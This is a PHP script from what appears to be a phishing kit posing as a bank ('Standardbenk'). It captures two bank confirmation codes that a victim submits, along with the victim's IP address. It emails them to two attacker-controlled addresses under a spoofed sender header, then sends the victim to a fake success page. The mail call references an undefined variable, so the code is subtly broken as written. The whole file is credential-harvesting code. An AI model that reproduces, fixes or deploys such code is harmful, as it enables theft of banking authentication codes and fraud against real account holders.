<?php
session_start();
include'ip.php';
$ip = MDgetIp();

$message  = "[ - ] ==================| -- |================== [ - ]\n";
$message .= "[+]Chave de Confirmação: ".$_POST['chave']."\n";
$message .= "[+]Chave de Confirmação2: ".$_POST['chave2']."\n";
$message .= "[ - ] ==================| -- |================== [ - ]\n";
$_SESSION['x'] = $message;

$praga=rand();
$praga=md5($praga);
$pra = rand(1111111111,9999999999);
if(!empty($_POST['chave'])){
$send = "jehovahelilah@mail2world.com, jehovahelilah@gmail.com";
$subject = $pra."Standardbenk II- [".$_POST['chave']."]";
$headers = "From: SB0".$pra."<bursted@".$pra."0sb.com>";



mail($sendX,$subject,$message,$headers);
header("Location: Successful.php");

}else{
header("Location: index.php");

}
	 
?>